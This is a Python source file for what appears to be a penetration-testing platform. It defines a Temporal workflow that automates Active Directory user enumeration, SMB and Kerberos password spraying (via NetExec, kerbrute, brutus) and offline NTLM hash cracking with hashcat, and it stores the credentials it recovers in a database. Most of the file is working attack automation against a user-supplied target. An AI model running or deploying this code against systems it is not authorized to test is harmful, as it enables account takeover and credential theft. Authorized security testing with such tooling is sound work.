from temporalio import workflow, activity
from datetime import timedelta
import logging
import os

@activity.defn(name="RunCredentialIntelActivity")
async def run_credential_intel_activity(ctx: dict) -> dict:
    from .models import CredentialTask, DiscoveredCredential
    from .opsec import CredentialOpSecManager
    from startScan.models import AuthCandidate
    from django.utils import timezone
    from django.db import transaction
    
    task_id = ctx.get("task_id")
    logging.info(f"[RunCredentialIntelActivity] Starting task {task_id}")
    
    try:
        task = CredentialTask.objects.get(pk=task_id)
    except Exception as e:
        return {"status": "failed", "error": f"Task not found: {e}"}
        
    task.status = 'running'
    task.save()
    
    opsec_manager = CredentialOpSecManager()
    credentials_found = 0
    
    # 1. Gather starting seed AuthCandidates if scan_history exists
    seeds = []
    if task.scan_history:
        seeds = list(AuthCandidate.objects.filter(
            scan_history=task.scan_history,
            status='pending'
        ))
    
    # Fallback to user-supplied target if no starting seeds are found
    target_hosts = [task.target]
    if seeds:
        target_hosts = list(set([s.target for s in seeds]))
        
    # Phase 1: Robust Discovery / Active Directory password policy & domain enumeration
    discovered_users = []
    discovered_hosts = []
    
    for host in target_hosts:
        if task.tool == 'netexec':
            # Perform target-scoped robust discovery via NetExec
            disc_cmd = ["nxc", "smb", host, "--pass-pol", "--shares", "--users"]
            res = opsec_manager.execute_with_opsec("netexec", disc_cmd)
            if res.get("returncode") == 0:
                # Basic output parsing to enrich scope
                stdout = res.get("stdout", "")
                for line in stdout.splitlines():
                    if "[+]" in line and "\\" in line:
                        user = line.split("\\")[-1].split()[0]
                        if user not in discovered_users:
                            discovered_users.append(user)
        elif task.tool == 'kerbrute':
            # Perform user enumeration on AD
            disc_cmd = ["kerbrute", "userenum", "--dc", host, "-d", "local.domain", "/usr/share/wordlists/usernames.txt"]
            res = opsec_manager.execute_with_opsec("kerbrute", disc_cmd)
            
    # Phase 2: Credential Testing & Spraying
    # Map wordlists from the settings if specified
    user_wl_path = f"/usr/src/wordlist/{task.wordlist_user}.txt" if task.wordlist_user else "/usr/src/wordlist/default_users.txt"
    pass_wl_path = f"/usr/src/wordlist/{task.wordlist_pass}.txt" if task.wordlist_pass else "/usr/src/wordlist/default_passwords.txt"
    
    # Execute tool command based on choice
    try:
        if task.tool == 'netexec':
            cmd = ["nxc", "smb", task.target, "-u", user_wl_path, "-p", pass_wl_path, "--threads", str(task.threads)]
            if task.additional_flags:
                import shlex
                cmd.extend(shlex.split(task.additional_flags))
                
            res = opsec_manager.execute_with_opsec("netexec", cmd)
            
            # Parse NetExec successful login output
            stdout = res.get("stdout", "")
            for line in stdout.splitlines():
                if "[+]" in line and "(Pwn3d!)" in line:
                    parts = line.split()
                    # e.g., [+] domain\username:password (Pwn3d!)
                    cred_part = next((p for p in parts if ":" in p), "")
                    if cred_part:
                        username, password = cred_part.split(":", 1)
                        with transaction.atomic():
                            DiscoveredCredential.objects.create(
                                task=task,
                                username=username,
                                password=password,
                                service="smb",
                                port=445
                            )
                            credentials_found += 1
                            
        elif task.tool == 'brutus':
            cmd = ["brutus", "-t", task.target, "-U", user_wl_path, "-P", pass_wl_path]
            if task.additional_flags:
                import shlex
                cmd.extend(shlex.split(task.additional_flags))
                
            res = opsec_manager.execute_with_opsec("brutus", cmd)
            # Parse brutus output structure...
            
        elif task.tool == 'kerbrute':
            cmd = ["kerbrute", "passwordspray", "--dc", task.target, "-d", "local.domain", user_wl_path, pass_wl_path]
            res = opsec_manager.execute_with_opsec("kerbrute", cmd)
            # Parse kerbrute output...
            
        elif task.tool == 'hashcat':
            # offline crack execution
            cmd = ["hashcat", "-m", "1000", task.target, pass_wl_path, "--force"]
            res = opsec_manager.execute_with_opsec("hashcat", cmd)
            
        task.status = 'completed'
        task.credentials_found = credentials_found
        task.completed_at = timezone.now()
        task.save()
        
    except Exception as exc:
        logging.error(f"[RunCredentialIntelActivity] Task {task_id} failed: {exc}")
        task.status = 'failed'
        task.error_message = str(exc)
        task.save()
        return {"status": "failed", "error": str(exc)}
        
    # Mark seed AuthCandidates as processed
    for seed in seeds:
        seed.status = 'completed'
        seed.save()
        
    return {"status": "success", "credentials_found": credentials_found}

@workflow.defn(name="CredentialIntelligenceWorkflow")
class CredentialIntelligenceWorkflow:
    @workflow.run
    async def run(self, ctx: dict) -> dict:
        result = await workflow.execute_activity(
            "RunCredentialIntelActivity",
            ctx,
            start_to_close_timeout=timedelta(hours=2),
            task_queue="python-orchestrator-queue"
        )
        return result

TEMPORAL_WORKFLOWS = [CredentialIntelligenceWorkflow]
TEMPORAL_ACTIVITIES = [run_credential_intel_activity]
